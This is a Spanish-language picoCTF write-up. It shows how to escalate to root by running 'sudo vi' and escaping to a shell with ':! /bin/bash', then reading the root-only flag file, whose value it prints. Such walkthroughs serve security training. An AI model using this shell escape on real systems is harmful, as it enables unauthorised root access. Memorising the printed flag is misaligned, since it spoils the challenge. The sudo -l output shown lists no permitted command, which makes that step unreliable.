## Descripción 
Can you read files in the root file?
Additional details will be available after launching your challenge instance.

Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 64030 picoplayer@saturn.picoctf.net Password: 33qE7mB5BF Can you login and read the root file?
## Solución
bueno en esta caso tenemos que revisar que permisos tenemos con 

```bash
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:

```

como podemos ver esto indica que nuestros permisos estan en vi, asi que lo ejecutamos como:

```bash
picoplayer@challenge:/$ sudo vi
```

esto nos abre una ventana en vi, en la cual si le damos esc, ponemos :  podemos poner comandos, donde poemos hacer lo siguiente 

```bash
:! /bin/bash
```

lo cual nos abre un espacie de terminal pero en vi, donde unicamente queda viajar desde ahi hasta el root para buscar la flag

```bash
No write since last change]
root@challenge:/home/picoplayer# ls -la /root
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Sep 15 01:30 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

root@challenge:/home/picoplayer# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}

```

solucion:
```
picoCTF{uS1ng_v1m_3dit0r_3dd6dcf4}
```
## Notas adicionales

## Referencias

- https://medium-com.translate.goog/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc&_x_tr_hist=true